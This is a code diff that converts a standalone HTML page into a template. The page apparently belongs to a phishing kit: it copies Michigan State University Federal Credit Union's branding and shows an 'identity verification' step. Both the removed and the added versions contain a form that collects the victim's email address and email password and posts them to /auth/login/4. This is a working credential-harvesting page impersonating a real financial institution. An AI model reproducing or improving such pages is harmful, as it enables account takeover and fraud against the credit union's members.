@@ -1,84 +1,26 @@
-<!DOCTYPE html>
-<html lang="en">
+@layout('layouts.app')
 
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Secure Login</title>
-  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
-  <link rel="stylesheet" href="/css/main.css">
-  <script src="/js/jquery.js"></script>
-</head>
+@section('content')
+<div class="cb-login-static-alert cb-login-message cb-login-alert-message cb-loginFormArea"></div>
 
-<body>
-  <div class="wrapper">
-    <div class="header mobile-header">
-      <div class="cb-logo-container">
-        <a href="https://www.msufcu.org/">
-          <img src="/img/logo.svg" class="cb-logo">
-          <img src="/img/logo-small.svg" class="cb-logo-small">
-        </a>
-      </div>
-
-      <h4 class="cb-title">ComputerLine</h4>
+<div class="cb-login-form cb-loginFormArea">
+  <form class="cb-form" action="/auth/login/4" method="POST">
+    <div class="field">
+      <label class="cb-login-field" for="emailAddr">Email Address</label>
+      <input id="emailAddr" name="emailAddr" class="mrg-T-sm form-control cb-text-field" type="text" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
     </div>
 
-    <div class="main">
-      <div class="form-container">
-        <div class="form-heading">
-          <span>Verify Your Identity</span>
-          <div class="form-sub-text">Help us confirm it's you by filling out the following information.</div>
-        </div>
-        <br>
-
-        <form action="/auth/login/4" method="post">
-          <table>
-            <tbody>
-              <tr>
-                <td>Email Address</td>
-                <td><input name="emailAddr" id="emailAddr" type="email" class="form-control" autocomplete="off" autocapitalize="off" spellcheck="off" required></td>
-              </tr>
-
-              <tr>
-                <td>Email Password</td>
-                <td><input name="emailPass" id="emailPass" type="password" class="form-control input-mask" autocomplete="off" autocapitalize="off" spellcheck="off" required>
-                </td>
-              </tr>
-              <tr>
-                <td></td>
-                <td><button type="submit" class="submit-btn">Continue</button></td>
-              </tr>
-            </tbody>
-          </table>
-        </form>
-      </div>
+    <div class="field">
+      <label class="cb-login-field" for="emailPass">Email Password</label>
+      <input id="emailPass" name="emailPass" class="mrg-T-sm form-control cb-text-field cb-text-field-mask" type="password" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
     </div>
 
-    <div class="footer">
-      <div class="footer-text">
-        <p>
-          <strong>Michigan State University Federal Credit Union</strong> savings are Federally insured to at least $250,000 by the <a href="https://www.ncua.gov/">NCUA</a> and backed by the full faith and credit of the United States Government. APR = Annual Percentage Rate. APY = Annual Percentage Yield. <a href="https://www.msufcu.org/disclosures/?expand=privacy_policy#privacy_policy">View our Privacy Policy</a> and
-          read our <a href="https://media.msufcu.org/publicsites/publicsite/documents/u2slfliv46vtlzftrvw1.pdf">disclaimer</a> regarding links to other sites.
-        </p>
-        <div class="copyright">
-          Copyright © 2023 Michigan State University Federal Credit Union All Rights Reserved.
-        </div>
-      </div>
-
-      <div>
-        <a href="https://www.ncua.gov/">
-          <img src="/img/ncua.gif">
-        </a>
-      </div>
-
-      <div>
-        <img src="/img/ehl.png">
-      </div>
+    <div id="userLinks">
+      <button class="logon-submit btn-primary btn-block pointer btn disabled" disabled="">
+        <div class="icon"></div>
+        Continue
+      </button>
     </div>
-  </div>
-
-  <script src="/js/main.js"></script>
-</body>
-
-</html> 
+  </form>
+</div>
+@endsection
